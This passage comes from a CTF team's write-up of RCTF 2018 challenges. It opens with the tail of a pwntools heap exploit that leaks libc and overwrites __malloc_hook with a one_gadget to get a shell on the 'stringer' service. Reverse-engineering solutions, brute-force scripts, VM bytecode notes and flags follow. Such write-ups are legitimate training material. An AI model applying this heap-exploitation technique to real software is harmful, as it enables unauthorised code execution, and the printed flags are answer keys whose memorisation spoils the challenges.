class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">file_addr=<span class="string">'./stringer'</span></span><br><span class="line">libc_addr=<span class="string">'./libc.so.6'</span></span><br><span class="line">host=<span class="string">'stringer.2018.teamrois.cn'</span></span><br><span class="line">port=<span class="number">7272</span></span><br><span class="line"></span><br><span class="line">libc=ELF(‘./libc.so<span class="number">.6</span>’)</span><br><span class="line">p=remote(host,port)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">malloc_hook_off=libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">free_hook_off=libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">unsorted_off=malloc_hook_off+<span class="number">88</span>+<span class="number">0x10</span></span><br><span class="line">fake_fastbin_malloc_hook=unsorted_off<span class="number">-88</span><span class="number">-0x13</span><span class="number">-0x20</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span><span class="params">(op)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'choice:'</span>,str(op))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">newsome</span><span class="params">(num,con)</span>:</span></span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'length:'</span>,str(num))</span><br><span class="line">    p.sendlineafter(<span class="string">'content:'</span>,con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">showsome</span><span class="params">()</span>:</span></span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">editsome</span><span class="params">(index,byteindex)</span>:</span></span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'index:'</span>,str(index))</span><br><span class="line">    p.sendlineafter(<span class="string">'index:'</span>,str(byteindex))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delsome</span><span class="params">(index)</span>:</span></span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'index:'</span>,str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">newsome(<span class="number">0x28</span>,<span class="string">'0'</span>*(<span class="number">0x10</span><span class="number">-4</span>)+p64(<span class="number">0x31</span>))</span><br><span class="line">newsome(<span class="number">0x100</span><span class="number">-0x20</span>,<span class="string">'1'</span>*<span class="number">0xc0</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x33</span>)+p64(<span class="number">0</span>))</span><br><span class="line">newsome(<span class="number">0x100</span>,<span class="string">'2'</span>*<span class="number">0x10</span>)</span><br><span class="line">newsome(<span class="number">0x60</span>,<span class="string">'3'</span>*<span class="number">0x10</span>)</span><br><span class="line">newsome(<span class="number">0x28</span>,<span class="string">'4'</span>*<span class="number">0x10</span>)</span><br><span class="line">delsome(<span class="number">0</span>)</span><br><span class="line">delsome(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">editsome(<span class="number">4</span>,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">newsome(<span class="number">0x28</span>,<span class="string">'5'</span>*<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#6</span></span><br><span class="line">newsome(<span class="number">0x28</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x181</span>))</span><br><span class="line"></span><br><span class="line">delsome(<span class="number">2</span>)</span><br><span class="line">delsome(<span class="number">3</span>)</span><br><span class="line">newsome(<span class="number">0x80</span>,<span class="string">'7'</span>*<span class="number">0x10</span>)</span><br><span class="line">newsome(<span class="number">0x90</span>,<span class="string">'8'</span>*<span class="number">0x70</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x73</span>))</span><br><span class="line">delsome(<span class="number">8</span>)</span><br><span class="line">newsome(<span class="number">0x60</span>,<span class="string">'9'</span>*(<span class="number">0x20</span><span class="number">-1</span>))</span><br><span class="line">p.recvuntil(<span class="string">'99999999\n'</span>)</span><br><span class="line">leak=u64(p.recvline().strip().ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc_base=leak-unsorted_off</span><br><span class="line"></span><br><span class="line">leaksome[<span class="string">'leak'</span>]=leak</span><br><span class="line">leaksome[<span class="string">'libc_base'</span>]=libc_base</span><br><span class="line"></span><br><span class="line"><span class="comment"># overwrite 2 0x71</span></span><br><span class="line"></span><br><span class="line">newsome(<span class="number">0x90</span>,<span class="string">'a'</span>*<span class="number">0x70</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>))</span><br><span class="line">delsome(<span class="number">10</span>)</span><br><span class="line">delsome(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">newsome(<span class="number">0x90</span>,<span class="string">'b'</span>*<span class="number">0x70</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>)+p64(libc_base+fake_fastbin_malloc_hook))</span><br><span class="line"></span><br><span class="line">delsome(<span class="number">0xb</span>)</span><br><span class="line">newsome(<span class="number">0x60</span>,<span class="string">'c'</span>*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">one_gadget=<span class="number">0xf02a4</span> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">newsome(<span class="number">0x60</span>,<span class="string">'d'</span>*<span class="number">3</span>+p64(libc_base+one_gadget)*<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">menu(<span class="number">1</span>)</span><br><span class="line">p.sendline(str(<span class="number">0x90</span>))</span><br><span class="line"></span><br><span class="line">show_leak()</span><br><span class="line">exp_bp(<span class="string">'aaaaaaa'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
<p>flag: <strong>RCTF{Is_th1s_c1-1unk_m4pped?_df3ac9}</strong></p>
<h2 id="0x03-RE"><a href="#0x03-RE" class="headerlink" title="0x03 RE"></a>0x03 RE</h2><h3 id="babyre"><a href="#babyre" class="headerlink" title="babyre"></a>babyre</h3><p>out数据4字节一组, 流程sub_80488E0, 算法sub_804868B(部分参数不相关), 字符0x20-0x7F穷举就完事儿了.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="keyword">uint32_t</span> foo(<span class="keyword">uint32_t</span> a1, <span class="keyword">uint64_t</span> a2) <span class="comment">// sub_804868B</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">int</span> j;</span><br><span class="line">	<span class="keyword">uint64_t</span> v5;</span><br><span class="line">	<span class="keyword">uint32_t</span> in;</span><br><span class="line">	in = a1;</span><br><span class="line">	<span class="keyword">for</span> (j = <span class="number">0</span>; j &lt;= <span class="number">527</span>; ++j)</span><br><span class="line">	&#123;</span><br><span class="line">		v5 = a2 &gt;&gt; (j &amp; <span class="number">0x1F</span>);</span><br><span class="line">		<span class="keyword">if</span> (j &amp; <span class="number">0x20</span>)</span><br><span class="line">			v5 = v5 &gt;&gt; <span class="number">32</span>;</span><br><span class="line">		in = (in &gt;&gt; <span class="number">1</span>) ^ ((v5 ^ in ^ (in &gt;&gt; <span class="number">16</span>) ^ (<span class="number">0x5C743A2E</span> &gt;&gt; (((in &gt;&gt; <span class="number">1</span>) &amp; <span class="number">1</span>)</span><br><span class="line">			+ <span class="number">2</span></span><br><span class="line">			* (<span class="number">2</span></span><br><span class="line">				* (((in &gt;&gt; <span class="number">20</span>) &amp; <span class="number">1</span>)</span><br><span class="line">					+ <span class="number">2</span></span><br><span class="line">					* (<span class="number">2</span> * ((in &amp; <span class="number">0x80000000</span>) != <span class="number">0</span>)</span><br><span class="line">						+ ((in &gt;&gt; <span class="number">26</span>) &amp; <span class="number">1</span>)))</span><br><span class="line">				+ ((in &gt;&gt; <span class="number">9</span>) &amp; <span class="number">1</span>))))) &lt;&lt; <span class="number">31</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> in;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">uint32_t</span> data[<span class="number">30</span>] = <span class="comment">// out</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="number">0xB80C91FE</span>,<span class="number">0x70573EFE</span>,</span><br><span class="line">		<span class="number">0xBEED92AE</span>,<span class="number">0x7F7A8193</span>,</span><br><span class="line">		<span class="number">0x7390C17B</span>,<span class="number">0x90347C6C</span>,</span><br><span class="line">		<span class="number">0xAA7A15DF</span>,<span class="number">0xAA7A15DF</span>,</span><br><span class="line">		<span class="number">0x526BA076</span>,<span class="number">0x153F1A32</span>,</span><br><span class="line">		<span class="number">0x545C15AD</span>,<span class="number">0x7D8AA463</span>,</span><br><span class="line">		<span class="number">0x526BA076</span>,<span class="number">0xFBCB7AA0</span>,</span><br><span class="line">		<span class="number">0x7D8AA463</span>,<span class="number">0x9C513266</span>,</span><br><span class="line">		<span class="number">0x526BA076</span>,<span class="number">0x6D7DF3E1</span>,</span><br><span class="line">		<span class="number">0xAA7A15DF</span>,<span class="number">0x9C513266</span>,</span><br><span class="line">		<span class="number">0x1EDC3864</span>,<span class="number">0x9323BC07</span>,</span><br><span class="line">		<span class="number">0x7D8AA463</span>,<span class="number">0xFBCB7AA0</span>,</span><br><span class="line">		<span class="number">0x153F1A32</span>,<span class="number">0x526BA076</span>,</span><br><span class="line">		<span class="number">0xF5650025</span>,<span class="number">0xAA7A15DF</span>,</span><br><span class="line">		<span class="number">0x1EDC3864</span>,<span class="number">0xB13AD888</span></span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">uint32_t</span> j;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">30</span>; i++)</span><br><span class="line">		<span class="keyword">for</span> (j = <span class="number">0x20</span>; j &lt; <span class="number">0x7F</span>; j++)</span><br><span class="line">			<span class="keyword">if</span> (foo(j, <span class="number">0x1D082C23A72BE4C1</span>) == data[i])</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">"%c"</span>, j);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>flag: <strong>RCTF{Kee1o9_1s_a1ready_so1ved}</strong> </p>
<h3 id="simple-vm"><a href="#simple-vm" class="headerlink" title="simple vm"></a>simple vm</h3><p>p.bin是虚拟机字节码. 输入长32, 加密后与常量比较. </p>
<p>常量偏移+0x005, hex1018431415474017101D4B121F49481853540157515305565A08585F0A0C5809. 输入偏移+0x111, hex3031323334353637383941424344454630313233343536373839414243444546, 既”0123456789ABCDEF0123456789ABCDEF”, 加密后hex101010101010101010106B696F696B69000000000000000000007B797F797B, 猜出算法解密常量.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">"1018431415474017101D4B121F49481853540157515305565A08585F0A0C5809"</span>.decode(<span class="string">"hex"</span>)</span><br><span class="line">ss = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="number">0x20</span>):</span><br><span class="line">    ss = ss + (<span class="string">"%c"</span> % ((<span class="number">0x20</span>+i) ^ ord(s[i])))</span><br><span class="line"><span class="keyword">print</span> ss</span><br></pre></td></tr></table></figure>
<p>字节码分析(未完成): </p>
<blockquote>
<p>0130000000 jmp loc_30<br>1018431415474017101D4B121F49481853540157515305565A08585F0A0C5809<br>0001020304050600000000</p>
<p>loc_30:<br>1500010000 set p<br>loc_35:<br>0E ++p<br>12 read p<br>0B putchar<br>0C 00010000 35000000 loop [100]+1=0A+1=0B times<br>66</p>
<p>1510010000 set p<br>loc_47:<br>0E ++p<br>0A getchar<br>66<br>16 write p<br>0C 10010000 47000000 loop [110]+1=1F+1=20 times<br>66</p>
<p>loc_55:</p>
<p>03 40010000 mov reg1, [imm] [140] = 0x20 // xor key<br>10 mov reg2, reg1<br>11 F1000000 add reg1, imm 0xF1 = 0x111 // input offset<br>13 mov reg1, [reg1]<br>04 43010000 mov [imm], reg1 [0x143]<br>08 mov reg1, ~(reg2 &amp; reg1)<br>04 41010000 mov [imm], reg1 [0x141]<br>10 mov reg1, reg2<br>03 40010000 mov reg1, [imm] [140]<br>08 mov reg1, ~(reg2 &amp; reg1)<br>04 42010000 mov [imm], reg1<br>03 41010000 mov reg1, [imm]<br>03 43010000 mov reg1, [imm]<br>08 mov reg1, ~(reg2 &amp; reg1)<br>10 mov reg1, reg2<br>03 42010000 mov reg1, [142]<br>08 mov reg1, ~(reg2 &amp; reg1)<br>04 44010000 mov [144], reg1<br>66<br>03 40010000<br>11 F1000000<br>10<br>03 44010000<br>16<br>05 40010000<br>0E<br>06 40010000<br>0C 45010000 55000000<br>66</p>
<p>locB6:<br>03 46010000 mov reg1 imm<br>11 05000000 add reg1, imm 0x05 // const offset<br>13 mov reg1,[reg1]<br>10 mov reg2, reg1<br>03 46010000 mov reg1 imm<br>11 11010000 add reg1 imm 0x0111<br>13 mov reg1,[reg1]<br>17 cmp                                                //memcmp<br>18 60010000 jne<br>0C 46010000 B60000000<br>17<br>60<br>1000066000000000000000000000000000000<br>000000000000000000000000000000<br>0A // 100<br>496E70757420466C61673A<br>0000000F<br>1F // 110<br>0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000<br>20000000<br>00<br>1F1F0000000000000000000557726F6E670A52696768740A00000015500100000E120B0C50010000650100000000000000<br>1556010000<br>0E<br>12<br>0B<br>0C500100007B010000<br>0000000000</p>
</blockquote>
<p>flag: <strong>RCTF{09a71bf084a93df7ce3def3ab1bd61f6}</strong> </p>
<h3 id="magic"><a href="#magic" class="headerlink" title="magic"></a>magic</h3><p>第一部分校验_time64返回值. 找msvcrt._time64引用发现校验函数sub_402268, 用multiasm写shellcode调用程序自身代码跑time(运行前手动将00405020处0x100个字节复制到00404C00).</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;0000000000404A00&gt;</span><br><span class="line">	lea rax, [0000000000405FF0]</span><br><span class="line">	mov dword ptr ds:[rax], 0x5AFFE78F</span><br><span class="line">	</span><br><span class="line">	@loop:</span><br><span class="line">	lea rdi, [0000000000405020]</span><br><span class="line">	lea rsi, [0000000000404C00]</span><br><span class="line">	mov rcx, 0x100</span><br><span class="line">	rep movsb</span><br><span class="line">	</span><br><span class="line">	call 0x0000000000402268</span><br><span class="line">	</span><br><span class="line">	lea rax, [0000000000405FF0]</span><br><span class="line">	mov eax, [rax]</span><br><span class="line">	cmp eax, 0x5B028A8F</span><br><span class="line">	jge short @breakme</span><br><span class="line">	</span><br><span class="line">	lea rax, ds:[0x00000000004099D0]</span><br><span class="line">	mov eax, dword ptr ds:[rax]</span><br><span class="line">	test eax, eax</span><br><span class="line">	je short @loop</span><br><span class="line">	</span><br><span class="line">	@breakme:</span><br><span class="line">	nop ; set a breakpoint here</span><br><span class="line">	</span><br><span class="line">	@hooktime:</span><br><span class="line">	lea rcx, [0000000000405FF0]</span><br><span class="line">	mov eax, [rcx]</span><br><span class="line">	add eax, 1</span><br><span class="line">	mov [rcx], eax</span><br><span class="line">	ret</span><br><span class="line">	</span><br><span class="line">&lt;0000000000402275&gt;</span><br><span class="line">	call @hooktime</span><br></pre></td></tr></table></figure>
<p>跑出time: 0x5B00E398</p>
<p>第二部分虚拟机. 断msvcrt.scanf找到校验函数sub_4023B1. 取26字节输入rc4(可能修改过)加密后传入虚拟机. 字节码分析:</p>
<blockquote>
<p>AB0300    mov r3, 00<br>AB041A    mov r4, 1A<br>AB0066    mov r0, 66<br>AA0502    mov r5, r2 ; r2 = input<br>A953    add    r5, r3<br>A005    mov r5, [r5]<br>AB06CC    mov r6, CC<br>A956    add    r5, r6<br>AB06FF    mov r6, FF<br>AC56    and    r5, r6<br>AE50    xor    r5, r0<br>AD00    neg    r0<br>AA0605    mov r6, r5<br>AA0501    mov r5, r1 ; r1 = const<br>A953    add    r5, r3<br>A005    mov r5, [r5]<br>AF5600    div r5, 00 ; cmp r5, r6<br>A701CC    jcc reg5<br>A935    add r3,    r5<br>AA0503    mov r5,    r3<br>AF5400    div r5, r4 ; cmp r5, r4<br>A6D1CC    jcc !reg5 </p>
</blockquote>
<p>常量解密:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">b = [<span class="number">0x89</span>, <span class="number">0xC1</span>, <span class="number">0xEC</span>, <span class="number">0x50</span>, <span class="number">0x97</span>, <span class="number">0x3A</span>, <span class="number">0x57</span>, <span class="number">0x59</span>, <span class="number">0xE4</span>, <span class="number">0xE6</span>, <span class="number">0xE4</span>, <span class="number">0x42</span>, <span class="number">0xCB</span>, <span class="number">0xD9</span>, <span class="number">0x08</span>, <span class="number">0x22</span>, <span class="number">0xAE</span>, <span class="number">0x9D</span>, <span class="number">0x7C</span>, <span class="number">0x07</span>, <span class="number">0x80</span>, <span class="number">0x8F</span>, <span class="number">0x1B</span>, <span class="number">0x45</span>, <span class="number">0x04</span>, <span class="number">0xE8</span>]</span><br><span class="line">s = <span class="string">""</span></span><br><span class="line">k = [<span class="number">0x66</span>,<span class="number">0x99</span>] </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, <span class="number">26</span>):</span><br><span class="line">    b[i] = b[i] ^ k[i &amp; <span class="number">1</span>]</span><br><span class="line">    b[i] = (b[i]+<span class="number">0x100</span><span class="number">-0xCC</span>) &amp; <span class="number">0xFF</span></span><br><span class="line">    s = s + (<span class="string">"%02X"</span> % b[i])</span><br><span class="line"><span class="keyword">print</span> s</span><br></pre></td></tr></table></figure>
<p>得到238CBEFD25D765F4B6B3B60FE174A2EFFC384ED21A4AB11096A5. 调试时手动替换rc4数据, 解密得”@ck_For_fun_02508iO2_2iOR}”. 输入程序得到字符画:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">the part of flag was protected by a magic spell!</span><br><span class="line">@ck_For_fun_02508iO2_2iOR&#125;</span><br><span class="line">.843fFDCb52bc573DA7e336b4BCC97C6E.</span><br><span class="line">.1adC4b19FEBA1Bf9D182FAe8Eac1AeBF.</span><br><span class="line">.CB7EEFeD2B2D6dd76f   bE  D0 ec92.</span><br><span class="line">.DD1C36EDBaf56 63b6 ad83 f5D a60D.</span><br><span class="line">.28CCE56eaBbcF 0Bb9 ed7F 669 aff7.</span><br><span class="line">.    dC   83     4    bf a01     .</span><br><span class="line">.  DAB 2a0 CBD eB74 9eF6 0De 1Bf .</span><br><span class="line">.  E15 d55A276 7A4c fA7 eE72 dc7 .</span><br><span class="line">.  afB bE0fa2e 7Bf9 Eb14 6A5 891 .</span><br><span class="line">.  DCf c907BF9 aFBB 28eA 4dE aB1 .</span><br><span class="line">.  B25 c5B 16d d90f 0cb0 D78 Edd .</span><br><span class="line">.  aEA7   eDaD   07 743A 935 27d .</span><br><span class="line">.D38f5b1FacEaBDeFBEEcbA4 0b9D0A0f.</span><br><span class="line">.ce1A5DFCe012a0a62A5e2D8  8e38C9A.</span><br><span class="line">.CC1b26fF12fC01f8aeB7cAC06c65FCbe.</span><br><span class="line">.e663471A878EcE289bee7c11d7f8CF7b.</span><br><span class="line">.--------------------------------.</span><br><span class="line">    @ck_For_fun_02508iO2_2iOR&#125;</span><br><span class="line">.--------------------------------.</span><br></pre></td></tr></table></figure>
<p>flag: <strong>rctf{h@ck_For_fun_02508iO2_2iOR}</strong> </p>
<h3 id="sql"><a href="#sql" class="headerlink" title="sql"></a><strong>sql</strong></h3><p><strong>指令集</strong><a href="https://www.sqlite.org/opcode.html" target="_blank" rel="noopener">https://www.sqlite.org/opcode.html</a></p>
<p><strong>类似与汇编代码。先初始化寄存器存的值，然后取值进行比较。</strong></p>
<p><strong>每行数值依次含义为</strong></p>
<p><img src="https://github.com/De1ta-team/De1ta-team.github.io/blob/master/img/20180522/media/1df2bfd3e7e211338aa6b82052456b38.png?raw=true" alt></p>
<p><strong>（用excel导入一下数据看起来比较清晰）</strong></p>
<p><strong>主要指令流程如下：</strong></p>
<p>goto 93</p>
<p>初始化一系列Interger和String到内存中</p>
<p>goto 2</p>
<p>OpenRead</p>
<p>Rewind # if the table or index is empty, jump to 91 (close)</p>
<p>循环Column（取值）、Function（调用substr(X,Y,Z)函数）、Ne（比较），简化如下：</p>
<p># The substr(X,Y,Z) function returns a substring of input string X that begins<br>with the Y-th character and which is Z characters long.</p>
<p>r2,1,1,f</p>
<p>r6,3,1,a</p>
<p>r10,25,1,r</p>
<p>r14,14,1,g</p>
<p>r18,9,1,_</p>
<p>r22,12,1,f</p>
<p>r25,21,1,r</p>
<p>r28,18,1,_</p>
<p>r31,28,1,}</p>
<p>r35,15,1,a</p>
<p>r38,2,1,l</p>
<p>r42,13,1,_</p>
<p>r45,16,1,l</p>
<p>r48,27,1,a</p>
<p>r51,7,1,q</p>
<p>r55,10,1,r</p>
<p>r58,22,1,e</p>
<p>r62,4,1,g</p>
<p>r65,24,1,e</p>
<p>r68,20,1,s</p>
<p>r72,11,1,o</p>
<p>r76,8,1,s</p>
<p>r79,19,1,s</p>
<p>r82,6,1,l</p>
<p>r85,26,1,_</p>
<p>r88,23,1,v</p>
<p>r92,5,1,{</p>
<p>r96,17,1,f</p>
<p>（前三列为substr的三个参数，最后一列为用作比较的字符）</p>
<p>调整一下顺序可得flag</p>
<p>flag: <strong>flag{lqs_rof_galf_esrever_a}</strong></p>
<h3 id="compiler"><a href="#compiler" class="headerlink" title="compiler"></a>compiler</h3><p>第一部分compiler, gcc编译helloworld.c, 在程序中发现字符串:</p>
<blockquote>
<p>RCTF_HINT1: Compiler flag part 1 is here, but where is part 2? </p>
<p>You can think about this question: Why does this function exists in this binary?</p>
<p>RCTF_HINT2: part 2 is not in gcc, dont waste you time.</p>
</blockquote>
<p>断libc_start_main在栈中找到part1:”RCTF{Without”.</p>
<p>第二部分bash, 先12次flag, 再2次prince(executable name为bash)跳过公主死亡的剧情, 继续flag得到hint:</p>
<blockquote>
<p>The flag is (part1, plain(hash1), plain(hash2), plain(hash3), ‘}’).join(‘’)<br>The hashes of remaining flag is: 13340610174042144018, 95741437967718225, 484886919005526<br>I know the queen hijacked me by a function which used this hash algorithm!</p>
</blockquote>
<p>hijack用的是add_alias函数, hash算法在hash_insert中:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">v4 = *<span class="built_in">string</span>;</span><br><span class="line">v5 = <span class="built_in">string</span>;</span><br><span class="line"><span class="keyword">for</span> ( hash = <span class="number">0L</span>L; v4; v4 = *v5 )</span><br><span class="line">&#123;</span><br><span class="line">  ++v5;</span><br><span class="line">  hash = v4 ^ <span class="number">0x8B</span> * hash;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>穷举明文:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">(<span class="keyword">int</span> i, <span class="keyword">uint64_t</span> val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">uint64_t</span> base, v, ch;</span><br><span class="line">	<span class="keyword">int</span> j;</span><br><span class="line">	<span class="keyword">if</span> (val == <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (j = i - <span class="number">1</span>; j &gt;= <span class="number">0</span>; j--)</span><br><span class="line">		&#123;</span><br><span class="line">			<span 